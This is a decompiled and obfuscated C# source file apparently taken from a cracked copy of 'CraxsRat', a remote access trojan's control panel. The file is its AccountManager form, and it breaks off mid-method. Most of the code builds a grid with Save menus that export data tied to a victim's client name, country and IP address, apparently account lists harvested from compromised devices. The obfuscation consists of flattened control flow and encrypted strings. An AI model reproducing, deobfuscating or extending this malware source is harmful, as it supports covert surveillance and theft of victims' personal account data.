// Decompiled with JetBrains decompiler
// Type: Craxs_Rat.AccountManager
// Assembly: CraxsRat, Version=6.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 518449F5-7012-4EDA-9924-A26EC676C6A1
// Assembly location: C:\Users\HP\Downloads\CraxsRat v6.8 by TG @Hackfilter - Copy\CraxsRat VIP\CraxsRat_protected.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;

#nullable disable
namespace Craxs_Rat
{
  [DesignerGenerated]
  public class AccountManager : Form
  {
    public int imageCounter;
    public int totalImages;
    public string Downloadfolder;
    private IContainer components;
    private string FirstTipEN;
    private string FirstTipAR;
    private string FirstTipCN;
    private string ARtipFW;
    private string ARtipTR;
    private string ENtipTR;
    private string ENtipFW;

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      // ISSUE: reference to a compiler-generated field
      ((AccountManager._Closure\u0024__) this).components = (IContainer) new System.ComponentModel.Container();
      DataGridViewCellStyle gridViewCellStyle1 = new DataGridViewCellStyle();
label_1:
      int num1 = -2134621842;
      DataGridViewCellStyle gridViewCellStyle2;
      DataGridViewCellStyle gridViewCellStyle3;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (~(num1 + (-(-(1246740125 + 543261227) ^ ~-418077722) ^ -((724861400 - 1398803388 - (-1200532482 - 698206400)) * -1008122027))) * -605710975)) % 67U)
        {
          case 0:
            this.DGV0.TabIndex = 3;
            num1 = (int) num2 * 1574569282 ^ -1479355248;
            continue;
          case 1:
            this.DGV0.AllowUserToResizeRows = false;
            this.DGV0.AutoSizeColumnsMode = DataGridViewAutoSizeColumnsMode.AllCells;
            num1 = (int) num2 * -504571874 ^ -248842394;
            continue;
          case 2:
            gridViewCellStyle1.BackColor = Color.Black;
            num1 = (int) num2 * 1842052301 ^ -1989511368;
            continue;
          case 3:
            this.TOpacity.Interval = 1;
            num1 = (int) num2 * 1678145696 ^ -2074428145;
            continue;
          case 4:
            gridViewCellStyle3.Font = new Font(EXGuarder.\u0031B5B3E04, 8.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
            gridViewCellStyle3.ForeColor = Color.FromArgb(95, 95, 250);
            gridViewCellStyle3.SelectionBackColor = SystemColors.Highlight;
            num1 = (int) num2 * -1652449579 ^ 2068963597;
            continue;
          case 5:
            this.ctxMenu.Size = new Size(90, 48);
            num1 = (int) num2 * 219574295 ^ 2004673842;
            continue;
          case 6:
            this.Name = EXGuarder.\u0033F2F056F;
            this.Opacity = 0.0;
            num1 = (int) num2 * 1452938626 ^ -1553382415;
            continue;
          case 7:
            this.SaveAsToolStripMenuItem.Text = EXGuarder.\u00364127477;
            this.SaveAsToolStripMenuItem.Visible = false;
            num1 = (int) num2 * -108305561 ^ 995534660;
            continue;
          case 8:
            this.Column2.MinimumWidth = 2;
            num1 = (int) num2 * -1001178573 ^ -1763190938;
            continue;
          case 9:
            this.ctxMenu.ResumeLayout(false);
            num1 = (int) num2 * 1560267622 ^ 2137417101;
            continue;
          case 10:
            this.DGV0.CellBorderStyle = DataGridViewCellBorderStyle.SingleVertical;
            num1 = (int) num2 * -1951173971 ^ -12943313;
            continue;
          case 11:
            gridViewCellStyle3.WrapMode = DataGridViewTriState.True;
            this.DGV0.RowHeadersDefaultCellStyle = gridViewCellStyle3;
            num1 = (int) num2 * 1385860624 ^ 1964880815;
            continue;
          case 12:
            this.BoxTitle = new PictureBox();
            ((ISupportInitialize) this.DGV0).BeginInit();
            num1 = (int) num2 * -694661377 ^ 1756362112;
            continue;
          case 13:
            this.DGV0.Dock = DockStyle.Fill;
            num1 = (int) num2 * -176942101 ^ -1796822095;
            continue;
          case 14:
            this.SaveAsToolStripMenuItem.Name = EXGuarder.\u0035B437746;
            this.SaveAsToolStripMenuItem.Size = new Size(89, 22);
            num1 = (int) num2 * 1300632335 ^ 38808191;
            continue;
          case 15:
            this.DGV0.ContextMenuStrip = this.ctxMenu;
            gridViewCellStyle2.Alignment = DataGridViewContentAlignment.MiddleLeft;
            gridViewCellStyle2.BackColor = Color.Black;
            num1 = (int) num2 * -997916175 ^ 930149857;
            continue;
          case 16:
            this.DGV0.AutoSizeRowsMode = DataGridViewAutoSizeRowsMode.AllCells;
            this.DGV0.BackgroundColor = Color.FromArgb(10, 0, 10);
            num1 = (int) num2 * -251017460 ^ -1447059460;
            continue;
          case 17:
            this.Column6 = new DataGridViewTextBoxColumn();
            num1 = (int) num2 * 1703044109 ^ -755168056;
            continue;
          case 18:
            goto label_1;
          case 19:
            this.ClientSize = new Size(414, 241);
            num1 = (int) num2 * -549186071 ^ 1978493528;
            continue;
          case 20:
            this.SaveAsToolStripMenuItem = new ToolStripMenuItem();
            // ISSUE: reference to a compiler-generated field
            this.TOpacity = new System.Windows.Forms.Timer(((AccountManager._Closure\u0024__) this).components);
            this.PB = new ProgressBar();
            num1 = (int) num2 * -1348786263 ^ 192829041;
            continue;
          case 21:
            this.BoxTitle.InitialImage = (Image) null;
            num1 = (int) num2 * 890927564 ^ 688799843;
            continue;
          case 22:
            this.Column1.HeaderText = EXGuarder.\u00329524910;
            this.Column1.Name = EXGuarder.\u003775D0C63;
            num1 = (int) num2 * -697597607 ^ 541196343;
            continue;
          case 23:
            goto label_3;
          case 24:
            gridViewCellStyle1.Alignment = DataGridViewContentAlignment.MiddleLeft;
            num1 = (int) num2 * -986883564 ^ -832774713;
            continue;
          case 25:
            this.SaveToolStripMenuItem = new ToolStripMenuItem();
            num1 = (int) num2 * -1919461972 ^ 180255718;
            continue;
          case 26:
            this.Column2.Name = EXGuarder.\u0032D40102E;
            this.Column2.SortMode = DataGridViewColumnSortMode.Programmatic;
            this.Column2.Width = 2;
            this.ctxMenu.Items.AddRange(new ToolStripItem[2]
            {
              (ToolStripItem) this.SaveToolStripMenuItem,
              (ToolStripItem) this.SaveAsToolStripMenuItem
            });
            num1 = (int) num2 * 2041254327 ^ 749739312;
            continue;
          case 27:
            gridViewCellStyle2.WrapMode = DataGridViewTriState.False;
            this.DGV0.DefaultCellStyle = gridViewCellStyle2;
            num1 = (int) num2 * 652604868 ^ -1372720865;
            continue;
          case 28:
            this.Column6.Name = EXGuarder.\u0036D661742;
            this.Column6.Width = 75;
            num1 = (int) num2 * -1887461058 ^ -1018338499;
            continue;
          case 29:
            gridViewCellStyle2.SelectionForeColor = Color.Black;
            num1 = (int) num2 * -539049255 ^ -52273444;
            continue;
          case 30:
            this.PB.Location = new Point(0, 213);
            this.PB.Name = EXGuarder.\u0030763076A;
            num1 = (int) num2 * -647043189 ^ -865313509;
            continue;
          case 31:
            this.BoxTitle.TabStop = false;
            num1 = (int) num2 * -1929539802 ^ 1443636818;
            continue;
          case 32:
            this.Column2 = new DataGridViewImageColumn();
            // ISSUE: reference to a compiler-generated field
            this.ctxMenu = new ContextMenuStrip(((AccountManager._Closure\u0024__) this).components);
            num1 = (int) num2 * -537210137 ^ 1007229774;
            continue;
          case 33:
            this.SuspendLayout();
            this.DGV0.AllowUserToAddRows = false;
            num1 = (int) num2 * 1551832450 ^ -807973566;
            continue;
          case 34:
            this.AutoScaleMode = AutoScaleMode.Font;
            num1 = (int) num2 * 620166295 ^ 1233520694;
            continue;
          case 35:
            gridViewCellStyle1.WrapMode = DataGridViewTriState.True;
            this.DGV0.ColumnHeadersDefaultCellStyle = gridViewCellStyle1;
            this.DGV0.ColumnHeadersHeightSizeMode = DataGridViewColumnHeadersHeightSizeMode.AutoSize;
            num1 = (int) num2 * 1379537198 ^ 85834782;
            continue;
          case 36:
            this.DGV0.GridColor = Color.White;
            this.DGV0.Location = new Point(0, 0);
            this.DGV0.Name = EXGuarder.\u003775A5E5D;
            this.DGV0.RowHeadersBorderStyle = DataGridViewHeaderBorderStyle.Single;
            num1 = (int) num2 * 477909394 ^ -1032816074;
            continue;
          case 37:
            this.ResumeLayout(false);
            num1 = (int) num2 * 745014238 ^ -1652685689;
            continue;
          case 38:
            gridViewCellStyle2 = new DataGridViewCellStyle();
            gridViewCellStyle3 = new DataGridViewCellStyle();
            num1 = (int) num2 * -80610224 ^ -837870135;
            continue;
          case 39:
            this.PB.Size = new Size(414, 10);
            this.PB.TabIndex = 6;
            num1 = (int) num2 * 2000700945 ^ -1989882204;
            continue;
          case 40:
            gridViewCellStyle2.ForeColor = Color.FromArgb(95, 95, 250);
            gridViewCellStyle2.SelectionBackColor = Color.FromArgb(190, 190, 190);
            num1 = (int) num2 * 1995463181 ^ 632069544;
            continue;
          case 41:
            this.BoxTitle.Dock = DockStyle.Bottom;
            num1 = (int) num2 * -553900970 ^ 1701536825;
            continue;
          case 42:
            this.Column1.Width = 78;
            this.Column6.HeaderText = EXGuarder.\u00307476F65;
            num1 = (int) num2 * -402212645 ^ 1297570281;
            continue;
          case 43:
            this.DGV0.RowHeadersVisible = false;
            this.DGV0.SelectionMode = DataGridViewSelectionMode.FullRowSelect;
            this.DGV0.Size = new Size(414, 213);
            num1 = (int) num2 * 342019508 ^ -296576120;
            continue;
          case 44:
            this.DGV0.ColumnHeadersBorderStyle = DataGridViewHeaderBorderStyle.None;
            num1 = (int) num2 * 821445769 ^ 418983429;
            continue;
          case 45:
            this.ctxMenu.Name = EXGuarder.\u0036E525622;
            this.ctxMenu.ShowImageMargin = false;
            num1 = (int) num2 * -1997389675 ^ 1837503507;
            continue;
          case 46:
            this.ctxMenu.SuspendLayout();
            ((ISupportInitialize) this.BoxTitle).BeginInit();
            num1 = (int) num2 * -146405500 ^ -2046972087;
            continue;
          case 47:
            ((ISupportInitialize) this.BoxTitle).EndInit();
            num1 = (int) num2 * -1452082124 ^ 1790235826;
            continue;
          case 48:
            this.Text = EXGuarder.\u0033F2F056F;
            ((ISupportInitialize) this.DGV0).EndInit();
            num1 = (int) num2 * 712827314 ^ -735658428;
            continue;
          case 49:
            this.BoxTitle.ErrorImage = (Image) null;
            num1 = (int) num2 * 43067780 ^ 592577144;
            continue;
          case 50:
            gridViewCellStyle3.SelectionForeColor = SystemColors.HighlightText;
            num1 = (int) num2 * 1248050133 ^ 2131829495;
            continue;
          case 51:
            this.DGV0.AllowUserToResizeColumns = false;
            num1 = (int) num2 * 1582371262 ^ -1148751080;
            continue;
          case 52:
            this.SaveToolStripMenuItem.Name = EXGuarder.\u00363752B41;
            this.SaveToolStripMenuItem.Size = new Size(89, 22);
            this.SaveToolStripMenuItem.Text = EXGuarder.\u00341211349;
            this.SaveToolStripMenuItem.Visible = false;
            num1 = (int) num2 * 287044794 ^ -79500142;
            continue;
          case 53:
            gridViewCellStyle1.Font = new Font(EXGuarder.\u0031B5B3E04, 8.25f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
            gridViewCellStyle1.ForeColor = Color.FromArgb(95, 95, 250);
            gridViewCellStyle1.SelectionBackColor = SystemColors.Highlight;
            gridViewCellStyle1.SelectionForeColor = SystemColors.HighlightText;
            num1 = (int) num2 * -1704536666 ^ 920597207;
            continue;
          case 54:
            this.BoxTitle.BackColor = Color.Black;
            num1 = (int) num2 * -363954025 ^ 1176520225;
            continue;
          case 55:
            this.DGV0.AllowUserToDeleteRows = false;
            num1 = (int) num2 * -48732189 ^ 2091163672;
            continue;
          case 56:
            gridViewCellStyle3.Alignment = DataGridViewContentAlignment.MiddleLeft;
            gridViewCellStyle3.BackColor = Color.Black;
            num1 = (int) num2 * 1679368908 ^ 1763917315;
            continue;
          case 57:
            this.Controls.Add((Control) this.DGV0);
            this.Controls.Add((Control) this.PB);
            num1 = (int) num2 * 1802504426 ^ -342673305;
            continue;
          case 58:
            this.DGV0.EditMode = DataGridViewEditMode.EditProgrammatically;
            this.DGV0.EnableHeadersVisualStyles = false;
            num1 = (int) num2 * -1482074436 ^ 793985727;
            continue;
          case 59:
            this.DGV0.Columns.AddRange((DataGridViewColumn) this.Column1, (DataGridViewColumn) this.Column6, (DataGridViewColumn) this.Column2);
            num1 = (int) num2 * -998454081 ^ 1797015098;
            continue;
          case 60:
            this.PB.Dock = DockStyle.Bottom;
            num1 = (int) num2 * 1506300998 ^ 946903828;
            continue;
          case 61:
            this.BoxTitle.Location = new Point(0, 223);
            this.BoxTitle.Name = EXGuarder.\u00368270A59;
            this.BoxTitle.Size = new Size(414, 18);
            this.BoxTitle.TabIndex = 7;
            num1 = (int) num2 * 1446280631 ^ 1620992743;
            continue;
          case 62:
            this.DGV0 = new DataGridView();
            this.Column1 = new DataGridViewTextBoxColumn();
            num1 = (int) num2 * -1424131505 ^ -558277960;
            continue;
          case 63:
            this.AutoScaleDimensions = new SizeF(6f, 13f);
            num1 = (int) num2 * -1296051549 ^ 1315370611;
            continue;
          case 64:
            this.Controls.Add((Control) this.BoxTitle);
            num1 = (int) num2 * -1500369015 ^ 1212465802;
            continue;
          case 65:
            gridViewCellStyle2.Font = new Font(EXGuarder.\u0031B5B3E04, 8.25f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
            num1 = (int) num2 * -908106748 ^ -739906262;
            continue;
          case 66:
            this.Column2.AutoSizeMode = DataGridViewAutoSizeColumnMode.None;
            this.Column2.FillWeight = 1f;
            this.Column2.HeaderText = EXGuarder.\u0032A033E1C;
            num1 = (int) num2 * -1472937086 ^ -819365711;
            continue;
          default:
            goto label_69;
        }
      }
label_3:
      return;
label_69:;
    }

    internal virtual DataGridView DGV0
    {
      get => ((AddNumber) this)._DGV0;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        DataGridViewRowsRemovedEventHandler removedEventHandler = new DataGridViewRowsRemovedEventHandler(this.DGV0_RowsRemoved);
        DataGridViewRowsAddedEventHandler addedEventHandler = new DataGridViewRowsAddedEventHandler(this.DGV0_RowsAdded);
label_1:
        int num1 = 466887255;
        while (true)
        {
          int num2 = num1;
          uint num3;
          DataGridView dgV0;
          EventHandler eventHandler;
          switch ((num3 = (uint) ((937567339 + 622646715 - ((~num2 - (~~197547552 + -2104514266 * 1425415991 * 668659007 ^ --2023475247 + (~1010659771 - 77627819))) * 41409089 ^ (96241325 ^ 1391012) + (-1211243591 - 42149921))) * -1848788287)) % 11U)
          {
            case 0:
              dgV0.RowsRemoved += removedEventHandler;
              dgV0.RowsAdded += addedEventHandler;
              dgV0.SelectionChanged += eventHandler;
              num1 = (int) num3 * 753367355 ^ 1173037129;
              continue;
            case 1:
              ((AddNumber) this)._DGV0 = value;
              num1 = -562257648;
              continue;
            case 2:
              goto label_1;
            case 3:
              dgV0.SelectionChanged -= eventHandler;
              num1 = (int) num3 * -45952681 ^ 630727335;
              continue;
            case 4:
              dgV0 = ((AddNumber) this)._DGV0;
              num1 = (int) num3 * -553643124 ^ 1032606391;
              continue;
            case 5:
              dgV0.RowsRemoved -= removedEventHandler;
              num1 = (int) num3 * -1155926158 ^ 1612418071;
              continue;
            case 6:
              eventHandler = new EventHandler(this.DGV0_SelectionChanged);
              dgV0 = ((AddNumber) this)._DGV0;
              num1 = (int) num3 * 1604611637 ^ 1756925379;
              continue;
            case 7:
              int num4 = dgV0 == null ? -1538089470 : (num4 = -829775166);
              num1 = num4 ^ (int) num3 * 573689924;
              continue;
            case 8:
              int num5 = dgV0 == null ? 2011699380 : (num5 = 1569752483);
              num1 = num5 ^ (int) num3 * 870141664;
              continue;
            case 9:
              goto label_3;
            case 10:
              dgV0.RowsAdded -= addedEventHandler;
              num1 = (int) num3 * -815844183 ^ 896111300;
              continue;
            default:
              goto label_13;
          }
        }
label_3:
        return;
label_13:;
      }
    }

    internal virtual ContextMenuStrip ctxMenu
    {
      get => ((AddNumber) this)._ctxMenu;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((AddNumber) this)._ctxMenu = value;
    }

    internal virtual ToolStripMenuItem SaveToolStripMenuItem
    {
      get => ((AddNumber) this)._SaveToolStripMenuItem;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.SaveToolStripMenuItem_Click);
        ToolStripMenuItem toolStripMenuItem = ((AddNumber) this)._SaveToolStripMenuItem;
label_1:
        int num1 = 938999468;
        while (true)
        {
          int num2 = num1;
          uint num3;
          switch ((num3 = (uint) ~(881545042 * -708150883 - ~(-(num2 + (-1687867233 * (-167405363 * -175094666 + -648564855 * -99689927 ^ 810044454 ^ -1946727284 ^ -378316654 ^ 808131778) + -2092016442 * -679746769)) - (-1591279352 - 1854362629 - ~2037768155) * 772076171))) % 7U)
          {
            case 0:
              goto label_1;
            case 1:
              int num4 = toolStripMenuItem == null ? 935851723 : (num4 = 568153881);
              num1 = num4 ^ (int) num3 * 1094472704;
              continue;
            case 2:
              toolStripMenuItem.Click -= eventHandler;
              num1 = (int) num3 * -284482955 ^ 793203682;
              continue;
            case 3:
              int num5 = toolStripMenuItem == null ? -763376807 : (num5 = 247159665);
              num1 = num5 ^ (int) num3 * -1961020442;
              continue;
            case 4:
              toolStripMenuItem.Click += eventHandler;
              num1 = (int) num3 * 1623138575 ^ -393371694;
              continue;
            case 5:
              goto label_3;
            case 6:
              ((AddNumber) this)._SaveToolStripMenuItem = value;
              toolStripMenuItem = ((AddNumber) this)._SaveToolStripMenuItem;
              num1 = -1562605140;
              continue;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    internal virtual ToolStripMenuItem SaveAsToolStripMenuItem
    {
      get => ((AddNumber) this)._SaveAsToolStripMenuItem;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.SaveAsToolStripMenuItem_Click);
label_1:
        int num1 = -1569707730;
        while (true)
        {
          int num2 = num1;
          uint num3;
          ToolStripMenuItem toolStripMenuItem;
          switch ((num3 = (uint) (2139137058 - ~(--(1604306261 + 1118760323 + (-733204604 ^ -874456623)) - (num2 ^ ~(-1293502175 * ~~1474103396) + (376487084 - -1081629625))) ^ -1925857939 - -354038118)) % 8U)
          {
            case 0:
              toolStripMenuItem.Click -= eventHandler;
              num1 = (int) num3 * -1690041255 ^ -1721094679;
              continue;
            case 1:
              toolStripMenuItem = ((AddNumber) this)._SaveAsToolStripMenuItem;
              num1 = (int) num3 * 1950644191 ^ -1892319900;
              continue;
            case 2:
              goto label_1;
            case 3:
              toolStripMenuItem.Click += eventHandler;
              num1 = (int) num3 * -625913343 ^ 1450035823;
              continue;
            case 4:
              ((AddNumber) this)._SaveAsToolStripMenuItem = value;
              toolStripMenuItem = ((AddNumber) this)._SaveAsToolStripMenuItem;
              num1 = 1268684042;
              continue;
            case 5:
              int num4 = toolStripMenuItem == null ? -1997251482 : (num4 = 1514144122);
              num1 = num4 ^ (int) num3 * 280750426;
              continue;
            case 6:
              int num5 = toolStripMenuItem == null ? 1271264265 : (num5 = 1804116029);
              num1 = num5 ^ (int) num3 * 946199128;
              continue;
            case 7:
              goto label_3;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    internal virtual System.Windows.Forms.Timer TOpacity
    {
      get => ((AddNumber) this)._TOpacity;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.TOpacity_Tick);
        System.Windows.Forms.Timer topacity = ((AddNumber) this)._TOpacity;
label_1:
        int num1 = 1674621750;
        while (true)
        {
          int num2 = num1;
          uint num3;
          switch ((num3 = (uint) (-(1488729490 - 1136165791) - (num2 * -1503839011 + (--113326937 + ~(860157726 - 82303052) + (1476844245 * -1560288729 - (1764294148 - 72667741)) * 1852877469) + (-2092658851 * ~-591001369 ^ ~(-1653911734 ^ -754555478))))) % 7U)
          {
            case 0:
              topacity.Tick -= eventHandler;
              num1 = (int) num3 * -1578960353 ^ -752291902;
              continue;
            case 1:
              int num4 = topacity == null ? -1426040332 : (num4 = -1808743262);
              num1 = num4 ^ (int) num3 * -1059151271;
              continue;
            case 2:
              ((AddNumber) this)._TOpacity = value;
              topacity = ((AddNumber) this)._TOpacity;
              num1 = 1152794270;
              continue;
            case 3:
              goto label_1;
            case 4:
              int num5 = topacity == null ? -766440662 : (num5 = -2072716853);
              num1 = num5 ^ (int) num3 * 1377660767;
              continue;
            case 5:
              goto label_3;
            case 6:
              topacity.Tick += eventHandler;
              num1 = (int) num3 * 1512903052 ^ -1159212996;
              continue;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    internal virtual ProgressBar PB
    {
      get => ((AddNumber) this)._PB;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((AddNumber) this)._PB = value;
    }

    internal virtual PictureBox BoxTitle
    {
      get => ((AddNumber) this)._BoxTitle;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        PaintEventHandler paintEventHandler = new PaintEventHandler(this.BoxTitle_Paint);
label_1:
        int num1 = 1662729185;
        while (true)
        {
          int num2 = num1;
          uint num3;
          EventHandler eventHandler;
          PictureBox boxTitle;
          switch ((num3 = (uint) (1401128639 - ((~num2 - (~(~-1783160313 - ~816526198) - 54372958)) * -1305981585 * -1760280581 ^ -1491302))) % 10U)
          {
            case 0:
              boxTitle = ((AddNumber) this)._BoxTitle;
              int num4 = boxTitle == null ? -1689126881 : (num4 = 514319301);
              num1 = num4 ^ (int) num3 * 197631361;
              continue;
            case 1:
              eventHandler = new EventHandler(this.BoxTitle_Resize);
              num1 = (int) num3 * -36815445 ^ -1292088869;
              continue;
            case 2:
              boxTitle = ((AddNumber) this)._BoxTitle;
              int num5 = boxTitle == null ? -2034220949 : (num5 = 1636726052);
              num1 = num5 ^ (int) num3 * -1340893735;
              continue;
            case 3:
              boxTitle.Resize += eventHandler;
              num1 = (int) num3 * -798781625 ^ -58059620;
              continue;
            case 4:
              boxTitle.Paint += paintEventHandler;
              num1 = (int) num3 * -1246773161 ^ -225115471;
              continue;
            case 5:
              ((AddNumber) this)._BoxTitle = value;
              num1 = 242924048;
              continue;
            case 6:
              boxTitle.Resize -= eventHandler;
              num1 = (int) num3 * 1222460703 ^ -1525399229;
              continue;
            case 7:
              boxTitle.Paint -= paintEventHandler;
              num1 = (int) num3 * -573323102 ^ 1965394382;
              continue;
            case 8:
              goto label_1;
            case 9:
              goto label_3;
            default:
              goto label_12;
          }
        }
label_3:
        return;
label_12:;
      }
    }

    internal virtual DataGridViewTextBoxColumn Column1
    {
      get => ((AddNumber) this)._Column1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((AddNumber) this)._Column1 = value;
    }

    internal virtual DataGridViewTextBoxColumn Column6
    {
      get => ((AddNumber) this)._Column6;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((AddNumber) this)._Column6 = value;
    }

    internal virtual DataGridViewImageColumn Column2
    {
      get => ((Apk_studio) this)._Column2;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Apk_studio) this)._Column2 = value;
    }

    private void SpyStyle()
    {
      this.BoxTitle.BackColor = Settings.DefaultColor_Background;
      IEnumerator<DataGridView> enumerator;
      try
      {
        enumerator = this.Controls.OfType<DataGridView>().GetEnumerator();
label_8:
        int num1 = enumerator.MoveNext() ? 1581000400 : (num1 = 842180063);
        while (true)
        {
          int num2 = num1;
          uint num3;
          DataGridView current;
          switch ((num3 = (uint) (~(-((611137791 - 746980794 ^ 1253581220 + 495975732) + 1674996405 * ~-1594704844) - (num2 + --(--1742720389 * -298273949)) + (~910513128 * 877294635 - 1627004129 * -1294975237) ^ 507226586) ^ -677440425)) % 8U)
          {
            case 0:
              current.DefaultCellStyle.SelectionBackColor = getIconFrmReg.SHFILEINFOW.DefaultColor_Foreground;
              num1 = (int) num3 * -940139448 ^ 1448521612;
              continue;
            case 1:
              current.ColumnHeadersDefaultCellStyle.ForeColor = getIconFrmReg.SHFILEINFOW.DefaultColor_Foreground;
              num1 = (int) num3 * -467840533 ^ -440252471;
              continue;
            case 2:
              goto label_14;
            case 3:
              num1 = 1581000400;
              continue;
            case 4:
              current.ColumnHeadersDefaultCellStyle.BackColor = Settings.DefaultColor_Background;
              num1 = (int) num3 * 918968709 ^ -1832319473;
              continue;
            case 5:
              current = enumerator.Current;
              current.BackgroundColor = Settings.DefaultColor_Background;
              current.BackColor = Settings.DefaultColor_Background;
              num1 = 372408953;
              continue;
            case 6:
              current.DefaultCellStyle.BackColor = Settings.DefaultColor_Background;
              current.DefaultCellStyle.SelectionForeColor = Settings.DefaultColor_Background;
              current.DefaultCellStyle.ForeColor = getIconFrmReg.SHFILEINFOW.DefaultColor_Foreground;
              num1 = (int) num3 * 1453687247 ^ -1622345297;
              continue;
            case 7:
              goto label_8;
            default:
              goto label_10;
          }
        }
label_14:
        return;
label_10:;
      }
      finally
      {
        if (enumerator != null)
        {
label_12:
          int num4 = 1915297760;
          while (true)
          {
            int num5 = num4;
            uint num6;
            switch ((num6 = (uint) (~(-((611137791 - 746980794 ^ 1253581220 + 495975732) + 1674996405 * ~-1594704844) - (num5 + --(--1742720389 * -298273949)) + (~910513128 * 877294635 - 1627004129 * -1294975237) ^ 507226586) ^ -677440425)) % 3U)
            {
              case 0:
                goto label_12;
              case 1:
                enumerator.Dispose();
                num4 = (int) num6 * -411812720 ^ -566693663;
                continue;
              default:
                goto label_16;
            }
          }
        }
label_16:;
      }
    }

    private void TOpacity_Tick(object sender, EventArgs e)
    {
      if (this.Opacity == 1.0)
        goto label_6;
label_1:
      int num1 = 1321303746;
label_2:
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (--(~num1 - ~-1380787526 ^ ~-79456335) - 715614884)) % 5U)
        {
          case 0:
            goto label_1;
          case 1:
            this.Opacity += 0.1;
            num1 = (int) num2 * 557411450 ^ -954997768;
            continue;
          case 2:
            goto label_6;
          case 3:
            num1 = (int) num2 * -1124299342 ^ 7132376;
            continue;
          case 4:
            goto label_3;
          default:
            goto label_7;
        }
      }
label_3:
      return;
label_7:
      return;
label_6:
      this.TOpacity.Enabled = false;
      num1 = 814805792;
      goto label_2;
    }

    private void AccountManager_Load(object sender, EventArgs e)
    {
      this.Icon = new Icon(Settings.res_Path + EXGuarder.\u00319076557);
      this.DGV0.ColumnHeadersDefaultCellStyle.Font = Settings.f;
label_1:
      int num1 = -1029013122;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (-~(num1 + -~((--854392704 ^ --384542536) - (-1982576731 ^ -824982956) * -21237819) + (-(--154473947 + (1137642216 ^ -2050784820)) - 894971350) - (-1514952165 * (92295789 ^ 472329219) ^ -1798258396 ^ 834075002 - 1769664005)) - -1273347585)) % 6U)
        {
          case 1:
            this.SaveToolStripMenuItem.Visible = true;
            this.SaveAsToolStripMenuItem.Visible = true;
            num1 = (int) num2 * -857361409 ^ 5045975;
            continue;
          case 2:
            this.DGV0.DefaultCellStyle.Font = Settings.f;
            num1 = (int) num2 * -154818920 ^ 1189939969;
            continue;
          case 3:
            int num3 = Operators.CompareString(getIconFrmReg.SHFILEINFOW.SAVING_DATA, EXGuarder.\u003474A3022, false) != 0 ? -1032104381 : (num3 = -77543916);
            num1 = num3 ^ (int) num2 * 1185298615;
            continue;
          case 4:
            this.Text = ((Apk_studio) this).Title;
            num1 = 62356888;
            continue;
          case 5:
            goto label_1;
          default:
            goto label_7;
        }
      }
label_7:
      this.TOpacity.Interval = Settings.T_Interval;
      this.TOpacity.Enabled = true;
      ((Apk_studio) this).BoxTitlePaintEventArgsWait = true;
    }

    private void SaveAsToolStripMenuItem_Click(object sender, EventArgs e)
    {
      SaveFileDialog saveFileDialog = new SaveFileDialog();
label_1:
      int num1 = 1416664965;
      while (true)
      {
        uint num2;
        WaitCallback callBack;
        switch ((num2 = (uint) ---(num1 - ~-(1600601283 * (2032750130 - 993897708 + ~-560720541)) - (-(1544030077 - 1673944335) - -548844950) * -1750276525 + ~(-1474767997 ^ -1714590099 - 2089867713))) % 7U)
        {
          case 0:
            goto label_1;
          case 1:
            saveFileDialog.Filter = EXGuarder.\u0035D057341;
            int num3 = saveFileDialog.ShowDialog() != DialogResult.OK ? 767965427 : (num3 = 1626817649);
            num1 = num3 ^ (int) num2 * -198273112;
            continue;
          case 2:
            goto label_3;
          case 3:
            callBack = Apk_studio.\u0024IR55\u002D1;
            break;
          case 4:
            saveFileDialog.FileName = DateAndTime.Now.ToString(EXGuarder.\u00333475B19) + EXGuarder.\u003412D2D33;
            num1 = (int) num2 * -932243459 ^ 470236085;
            continue;
          case 5:
            if (Apk_studio.\u0024IR55\u002D1 == null)
            {
              // ISSUE: reference to a compiler-generated method
              callBack = Apk_studio.\u0024IR55\u002D1 = new WaitCallback(Apk_studio.\u0024I._Lambda\u0024__R55\u002D1);
              break;
            }
            num1 = (int) num2 * -1712578317 ^ 689368215;
            continue;
          case 6:
            saveFileDialog.Dispose();
            num1 = 790023805;
            continue;
          default:
            goto label_12;
        }
        object[] state = new object[8]
        {
          (object) this.DGV0,
          (object) EXGuarder.\u0035D31262F,
          (object) saveFileDialog.FileName,
          (object) ((Apk_studio) this).tmpClientName,
          (object) (((Apk_studio) this).tmpCountry + EXGuarder.\u00323330231 + ((Apk_studio) this).tmpAddressIP),
          (object) EXGuarder.\u003322D3C18,
          (object) EXGuarder.\u003560C3D61,
          (object) EXGuarder.\u0035D31262F
        };
        ThreadPool.QueueUserWorkItem(callBack, (object) state);
        num1 = 1517397875;
      }
label_3:
      return;
label_12:;
    }

    private void SaveToolStripMenuItem_Click(object sender, EventArgs e)
    {
      reso.Directory_Exist(((Apk_studio) this).classClient);
label_1:
      int num1 = -1792329089;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) ((~(-(num1 - ~~((1916519127 ^ 853334523) + (980823574 - -1704993115) ^ -979470745 - 1285316362 - (137086131 ^ -1498317339))) * -2054882109) ^ -304248244) - -1527303394)) % 3U)
        {
          case 1:
